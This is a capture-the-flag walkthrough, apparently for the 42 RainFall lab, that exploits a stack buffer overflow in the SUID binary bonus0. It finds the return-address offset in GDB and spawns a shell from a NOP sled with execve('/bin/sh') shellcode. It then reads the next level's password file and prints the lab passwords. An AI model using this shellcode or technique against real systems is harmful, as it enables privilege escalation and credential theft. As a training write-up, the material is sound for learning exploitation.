Login as `bonus0`.
```shell
┌──$ [~/42/2021/rainfall/level9]
└─>  ssh 192.168.0.39 -p 4242 -l bonus0
bonus0@192.168.0.39's password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
A `SUID` executable is located in the home directory.
```shell
bonus0@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```
Program segfaults when receive input of 20 A's.
```shell
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
Segmentation fault (core dumped)
```
Examine same scenario with GDB.
```gdb
bonus0@RainFall:~$ gdb ./bonus0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
Seems that EIP was overwritten with `BBBB`. Use pattern as second string to find offset.
```gdb
(gdb) break *main+39
Breakpoint 1 at 0x80485cb
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��

Breakpoint 1, 0x080485cb in main ()
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
Decode bytes to find out which part of second string shoud be replaced with an address.
```python
>>> "41336141".decode('hex')
'A3aA'
```
Remember that it should be reversed as it lays differently on memory. So the result is Aa3A rather that A3aA.
Second input should be `Aa0Aa1Aa2<memory_address>a4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
Now, a memory address of first string should be find.
```gdb
(gdb) set disassembly-flavor intel
(gdb) break *p+45
Breakpoint 1 at 0x80484e1
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -

Breakpoint 1, 0x080484e1 in p ()
(gdb) disassemble
Dump of assembler code for function p:
   [...]
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000   # 4096
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]             # buff
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
=> 0x080484e1 <+45>:	call   0x8048380 <read@plt>         # read(0, buff, 4096)
   [...]
End of assembler dump.
(gdb) p/x $eax
$1 = 0xbfffe680
(gdb) break *main+39
Breakpoint 2 at 0x80485cb
(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -

Breakpoint 1, 0x080484e1 in p ()
(gdb) continue
Continuing.
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��

Breakpoint 2, 0x080485cb in main ()
(gdb) x/32wx 0xbfffe680
0xbfffe680:	0x41306141	0x61413161	0x33614132	0x41346141
0xbfffe690:	0x61413561	0x37614136	0x41386141	0x62413961
0xbfffe6a0:	0x31624130	0x41326241	0x62413362	0x35624134
0xbfffe6b0:	0x41366241	0x62413762	0x39624138	0x41306341
0xbfffe6c0:	0x63413163	0x33634132	0x41346341	0x63413563
0xbfffe6d0:	0x37634136	0x41386341	0x64413963	0x31644130
0xbfffe6e0:	0x41326441	0x41414100	0x41414141	0x41414141
0xbfffe6f0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) x/1wx 0xbfffe689
0xbfffe689:	0x41336141
```
So, as it read at most 4096 bytes from stdin, a shell code can be placed as first string preceded by `NOP`.
```shell
bonus0@RainFall:~$ (python -c "print('\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"; python -c "import struct; print('Aa0Aa1Aa2' + struct.pack('I', 0xbfffe6c0) + 'a4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3')"; cat -) | /home/user/bonus0/bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2����a4Aa5Aa�� Aa0Aa1Aa2����a4Aa5Aa��
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
